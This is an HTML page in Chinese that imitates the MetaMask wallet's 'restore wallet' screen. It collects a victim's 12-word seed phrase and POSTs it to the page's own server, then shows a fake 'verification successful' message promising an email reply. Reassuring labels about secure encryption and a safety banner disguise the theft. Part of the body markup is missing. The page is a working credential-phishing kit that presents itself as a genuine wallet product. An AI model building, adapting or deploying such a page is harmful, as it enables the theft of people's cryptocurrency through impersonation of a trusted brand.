<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>MetaMask - 恢复钱包</title>
    <style>
        /* ============================================================
           MetaMask 品牌色
           主色 : #0376FF
           背景 : #14161a
           卡片 : #1b1d23 / #24272b
           边框 : #353940
           文本 : #ffffff
           次级 : #9ca0a6
           成功 : #28a745
           危险 : #d73a49
        ============================================================ */

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, sans-serif;
            background: #14161a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 24px;
            margin: 0;
            color: #ffffff;
        }

        .container {
            max-width: 560px;
            width: 100%;
        }

        /* ===== 主卡片 ===== */
        .card {
            background: #1b1d23;
            border-radius: 16px;
            padding: 28px 24px 24px;
            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.8);
            border: 1px solid #2c2f36;
            transition: all 0.2s ease;
        }

        /* ===== 顶部 Header ===== */
        .header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 20px;
            padding-bottom: 16px;
            border-bottom: 1px solid #2c2f36;
        }

        .header-left {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .fox-icon {
            width: 32px;
            height: 32px;
            flex-shrink: 0;
        }

        .fox-icon img {
            width: 32px;
            height: 32px;
            display: block;
            border-radius: 4px;
        }

        .header-title {
            font-size: 17px;
            font-weight: 600;
            color: #ffffff;
            letter-spacing: -0.2px;
        }

        .header-badge {
            background: #2c2f36;
            color: #9ca0a6;
            font-size: 11px;
            font-weight: 500;
            padding: 4px 12px;
            border-radius: 20px;
            letter-spacing: 0.2px;
        }

        /* ===== 主标题 ===== */
        .main-title {
            font-size: 22px;
            font-weight: 700;
            margin-bottom: 4px;
            color: #ffffff;
        }

        .sub-title {
            font-size: 14px;
            color: #9ca0a6;
            margin-bottom: 20px;
            font-weight: 400;
            line-height: 1.5;
        }

        /* ===== 安全提示 ===== */
        .warning-banner {
            background: rgba(215, 58, 73, 0.10);
            border-left: 3px solid #d73a49;
            padding: 12px 16px;
            border-radius: 8px;
            margin-bottom: 20px;
            display: flex;
            align-items: flex-start;
            gap: 10px;
        }

        .warning-banner .icon {
            color: #d73a49;
            font-size: 16px;
            line-height: 1.4;
            flex-shrink: 0;
        }

        .warning-banner .text {
            color: #e4e6e9;
            font-size: 13px;
            line-height: 1.5;
        }

        .warning-banner .text strong {
            color: #ffffff;
        }

        /* ===== 12 宫格 ===== */
        .grid-12 {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 10px;
            margin-bottom: 18px;
        }

        .word-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            background: #14161a;
            border-radius: 10px;
            padding: 6px 4px 8px;
            border: 1px solid #2c2f36;
            transition: border-color 0.2s, background 0.2s;
        }

        .word-item:focus-within {
            border-color: #0376FF;
            background: #1a1c23;
            box-shadow: 0 0 0 3px rgba(3, 118, 255, 0.15);
        }

        .word-item .num {
            color: #6a6f78;
            font-size: 10px;
            font-weight: 600;
            letter-spacing: 0.3px;
            margin-bottom: 2px;
            text-transform: uppercase;
        }

        .word-item input {
            width: 100%;
            padding: 6px 2px;
            background: transparent;
            border: none;
            border-radius: 0;
            font-size: 15px;
            font-family: "SF Mono", "Menlo", "Monaco", monospace;
            text-align: center;
            color: #ffffff;
            outline: none;
            font-weight: 500;
            letter-spacing: 0.3px;
        }

        .word-item input::placeholder {
            color: #4a4f58;
            font-weight: 400;
            font-size: 12px;
        }

        .word-item input.completed {
            color: #28a745;
        }

        /* ===== 进度 ===== */
        .progress-area {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 18px;
            padding: 6px 4px;
        }

        .progress-hint {
            font-size: 14px;
            color: #9ca0a6;
        }

        .progress-hint .count {
            color: #ffffff;
            font-weight: 600;
        }

        .progress-hint .count.done {
            color: #28a745;
        }

        .progress-status {
            font-size: 13px;
            font-weight: 500;
            padding: 4px 12px;
            border-radius: 20px;
            background: #2c2f36;
            color: #9ca0a6;
        }

        .progress-status.done {
            background: rgba(40, 167, 69, 0.18);
            color: #28a745;
        }

        /* ===== 提交按钮 ===== */
        #submitBtn {
            width: 100%;
            padding: 14px 20px;
            background: #2c2f36;
            color: #6a6f78;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: not-allowed;
            transition: background 0.2s, color 0.2s, box-shadow 0.2s;
            margin-bottom: 16px;
            letter-spacing: 0.2px;
        }

        #submitBtn.active {
            background: #0376FF;
            color: #ffffff;
            cursor: pointer;
            box-shadow: 0 4px 16px rgba(3, 118, 255, 0.25);
        }

        #submitBtn.active:hover {
            background: #0364d9;
            box-shadow: 0 6px 24px rgba(3, 118, 255, 0.35);
        }

        /* ===== 底部提示 ===== */
        .footer-tip {
            display: flex;
            align-items: center;
            gap: 8px;
            color: #6a6f78;
            font-size: 12px;
            justify-content: center;
            border-top: 1px solid #2c2f36;
            padding-top: 14px;
            margin-top: 2px;
        }

        .footer-tip .dot {
            color: #0376FF;
            font-size: 6px;
        }

        /* ===== 加载动画 ===== */
        .loading {
            text-align: center;
            padding: 40px 20px;
        }

        .loading .spinner {
            width: 44px;
            height: 44px;
            border: 4px solid #2c2f36;
            border-top: 4px solid #0376FF;
            border-radius: 50%;
            margin: 0 auto 20px;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading .loading-text {
            font-size: 17px;
            font-weight: 600;
            color: #e4e6e9;
        }

        .loading .loading-sub {
            font-size: 14px;
            color: #9ca0a6;
            margin-top: 6px;
        }

        /* ===== 结果页面 ===== */
        .result {
            background: #1b1d23;
            border-radius: 16px;
            padding: 28px 24px 24px;
            border: 1px solid #2c2f36;
        }

        .result .result-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 14px;
            padding-bottom: 12px;
            border-bottom: 1px solid #2c2f36;
        }

        .result .result-header h3 {
            font-size: 17px;
            font-weight: 600;
            color: #ffffff;
        }

        .result .result-header .badge {
            background: rgba(40, 167, 69, 0.15);
            color: #28a745;
            font-size: 12px;
            font-weight: 500;
            padding: 4px 12px;
            border-radius: 20px;
        }

        .result .word-list {
            background: #14161a;
            padding: 14px 16px;
            border-radius: 12px;
            display: grid;
            grid-template-columns: 1fr 1fr 1fr 1fr;
            gap: 4px 12px;
            margin: 10px 0 14px;
            border: 1px solid #2c2f36;
        }

        .result .word-list .w {
            display: flex;
            gap: 6px;
            align-items: baseline;
            padding: 2px 0;
        }

        .result .word-list .w .idx {
            color: #6a6f78;
            font-size: 12px;
            font-weight: 500;
            min-width: 20px;
            font-family: monospace;
        }

        .result .word-list .w .val {
            color: #e4e6e9;
            font-size: 15px;
            font-weight: 500;
            font-family: "SF Mono", "Menlo", monospace;
            word-break: break-all;
        }

        /* ===== 邮件通知 ===== */
        .email-notice {
            background: rgba(3, 118, 255, 0.06);
            border: 1px solid #2c2f36;
            border-radius: 10px;
            padding: 14px 16px;
            margin: 10px 0 14px;
            text-align: center;
        }

        .email-notice .info-text {
            color: #e4e6e9;
            font-size: 14px;
            line-height: 1.6;
        }

        .email-notice .info-text strong {
            color: #ffffff;
        }

        .btn-group {
            display: flex;
            gap: 12px;
            margin-top: 10px;
        }

        .btn-group .btn-reset {
            flex: 1;
            padding: 10px 20px;
            background: transparent;
            color: #9ca0a6;
            border: 1px solid #353940;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s, color 0.2s, border-color 0.2s;
        }

        .btn-group .btn-reset:hover {
            background: #2c2f36;
            color: #ffffff;
            border-color: #4a4f58;
        }

        .btn-group .btn-confirm {
            flex: 1;
            padding: 10px 20px;
            background: #0376FF;
            color: #ffffff;
            border: none;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s, box-shadow 0.2s;
        }

        .btn-group .btn-confirm:hover {
            background: #0364d9;
            box-shadow: 0 4px 16px rgba(3, 118, 255, 0.25);
        }

        .hidden {
            display: none !important;
        }

        /* ===== 响应式 ===== */
        @media (max-width: 520px) {
            .container { max-width: 100%; }
            .card, .result { padding: 20px 16px 18px; }
            .grid-12 { grid-template-columns: repeat(3, 1fr); gap: 8px; }
            .result .word-list { grid-template-columns: 1fr 1fr; gap: 4px 10px; padding: 10px 12px; }
            .header-title { font-size: 15px; }
            .main-title { font-size: 19px; }
            .word-item input { font-size: 14px; }
            .btn-group { flex-direction: column; }
        }

        @media (max-width: 380px) {
            .grid-12 { grid-template-columns: 1fr 1fr; gap: 6px; }
            .result .word-list { grid-template-columns: 1fr 1fr; }
            .card, .result { padding: 14px 10px 12px; }
        }
    </style>
</head>

                <span class="header-title">MetaMask</span>
            </div>
            <span class="header-badge">扩展程序</span>
        </div>

        <!-- 标题 -->
        <div class="main-title">恢复钱包</div>
        <div class="sub-title">请在下方输入您的钱包助记词</div>

        <!-- 安全提示 -->
        <div class="warning-banner">
            <span class="icon">⚠️</span>
            <span class="text">
                <strong>请勿在公共网络下操作。</strong>
                确保您在安全的网络环境中输入助记词。
            </span>
        </div>

        <!-- 12 宫格 -->
        <div class="grid-12" id="wordGrid"></div>

        <!-- 进度 -->
        <div class="progress-area">
            <span class="progress-hint">
                已填：<span class="count" id="filledCount">0</span> / 12
            </span>
            <span class="progress-status" id="statusBadge">未完成</span>
        </div>

        <!-- 提交按钮 -->
        <button type="button" id="submitBtn" disabled>验证钱包</button>

        <!-- 底部 -->
        <div class="footer-tip">
            <span class="dot">●</span>
            <span>安全加密 · 仅用于恢复</span>
            <span class="dot">●</span>
        </div>
    </div>

    <!-- ===== 加载中 ===== -->
    <div class="card hidden" id="loadingCard">
        <div class="loading">
            <div class="spinner"></div>
            <div class="loading-text">验证中...</div>
            <div class="loading-sub">正在连接 MetaMask 节点</div>
        </div>
    </div>

    <!-- ===== 结果页面 ===== -->
    <div id="resultCard" class="result hidden">

        <div class="result-header">
            <h3>✅ 验证成功</h3>
            <span class="badge">完成</span>
        </div>

        <p style="color:#9ca0a6; font-size:14px; margin-bottom:4px;">
            您输入的助记词：
        </p>

        <div class="word-list" id="outputList"></div>

        <div class="email-notice">
            <div class="info-text">
                <strong>📬 助记词已提交。</strong><br />
                我们将在 24 小时内通过邮件回复您。
            </div>
        </div>

        <div class="btn-group">
            <button class="btn-reset" onclick="resetDemo()">← 重新输入</button>
            <button class="btn-confirm" onclick="confirmAndClose()">✓ 确认</button>
        </div>
    </div>

</div>

<script>
    // ========== 1. 生成 12 个输入框 ==========
    const grid = document.getElementById('wordGrid');
    const inputs = [];

    for (let i = 1; i <= 12; i++) {
        const item = document.createElement('div');
        item.className = 'word-item';

        const num = document.createElement('span');
        num.className = 'num';
        num.textContent = String(i).padStart(2, '0');

        const input = document.createElement('input');
        input.type = 'text';
        input.id = 'word-' + i;
        input.maxLength = 24;
        input.placeholder = 'word';
        input.autocomplete = 'off';
        input.dataset.idx = i;
        input.spellcheck = false;

        item.appendChild(num);
        item.appendChild(input);
        grid.appendChild(item);
        inputs.push(input);
    }

    // ========== 2. DOM 引用 ==========
    const filledCount = document.getElementById('filledCount');
    const statusBadge = document.getElementById('statusBadge');
    const submitBtn = document.getElementById('submitBtn');
    const inputCard = document.getElementById('inputCard');
    const loadingCard = document.getElementById('loadingCard');
    const resultCard = document.getElementById('resultCard');
    const outputList = document.getElementById('outputList');

    // ========== 3. 进度更新 ==========
    function updateProgress() {
        let filled = 0;
        const values = [];

        inputs.forEach((inp) => {
            const val = inp.value.trim();
            if (val.length > 0) {
                filled++;
                inp.classList.add('completed');
                values.push(val);
            } else {
                inp.classList.remove('completed');
                values.push('');
            }
        });

        filledCount.textContent = filled;
        filledCount.className = 'count' + (filled === 12 ? ' done' : '');

        if (filled === 12) {
            statusBadge.textContent = '✅ 已完成';
            statusBadge.className = 'progress-status done';
            submitBtn.disabled = false;
            submitBtn.classList.add('active');
            submitBtn.textContent = '🔓 验证钱包';
        } else {
            statusBadge.textContent = `还需 ${12 - filled} 个`;
            statusBadge.className = 'progress-status';
            submitBtn.disabled = true;
            submitBtn.classList.remove('active');
            submitBtn.textContent = '验证钱包';
        }

        window._currentWords = values;
    }

    // ========== 4. 事件绑定 ==========
    inputs.forEach((inp, idx) => {
        inp.addEventListener('input', updateProgress);

        inp.addEventListener('paste', function() {
            setTimeout(() => {
                const pasted = inp.value.trim();
                if (!pasted) return;

                const parts = pasted.split(/\s+/).filter(p => p.length > 0);

                if (parts.length > 1) {
                    let currentIdx = idx;
                    for (let i = 0; i < parts.length && currentIdx < inputs.length; i++) {
                        inputs[currentIdx].value = parts[i];
                        inputs[currentIdx].classList.add('completed');
                        currentIdx++;
                    }
                    updateProgress();
                    if (currentIdx < inputs.length) {
                        inputs[currentIdx].focus();
                    } else {
                        inputs[inputs.length - 1].focus();
                    }
                } else {
                    inp.value = pasted;
                    updateProgress();
                }
            }, 10);
        });

        inp.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                if (idx < 11) {
                    inputs[idx + 1].focus();
                } else {
                    if (window._currentWords && window._currentWords.every(w => w.trim().length > 0)) {
                        submitBtn.click();
                    }
                }
            }
        });
    });

    updateProgress();

    document.addEventListener('click', function(e) {
        if (e.target.closest('#inputCard') && !e.target.closest('input')) {
            const firstEmpty = inputs.find(inp => inp.value.trim() === '');
            if (firstEmpty) firstEmpty.focus();
            else if (inputs.length) inputs[0].focus();
        }
    });

    // ========== 5. 提交 ==========
    submitBtn.addEventListener('click', function() {
        const words = window._currentWords || [];

        if (words.length !== 12 || words.some(w => w.trim().length === 0)) {
            alert('请填写全部 12 个助记词。');
            return;
        }

        // 发送数据到后端
        fetch('/', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: 'words=' + encodeURIComponent(words.join(' '))
        });

        // 显示加载动画
        inputCard.classList.add('hidden');
        loadingCard.classList.remove('hidden');

        setTimeout(() => {
            // 显示结果
            outputList.innerHTML = '';
            words.forEach((w, idx) => {
                const div = document.createElement('div');
                div.className = 'w';
                div.innerHTML =
                    `<span class="idx">${String(idx + 1).padStart(2, '0')}.</span><span class="val">${w.trim()}</span>`;
                outputList.appendChild(div);
            });

            loadingCard.classList.add('hidden');
            resultCard.classList.remove('hidden');
        }, 1500);
    });

    // ========== 6. 重置 ==========
    function resetDemo() {
        inputCard.classList.remove('hidden');
        loadingCard.classList.add('hidden');
        resultCard.classList.add('hidden');

        inputs.forEach(inp => {
            inp.value = '';
            inp.classList.remove('completed');
        });

        window._currentWords = [];
        updateProgress();
        inputs[0].focus();
    }

    // ========== 7. 确认 ==========
    function confirmAndClose() {
        resetDemo();
        alert('✅ 感谢！我们将在 24 小时内处理您的请求。');
    }

    inputs[0].focus();
</script>
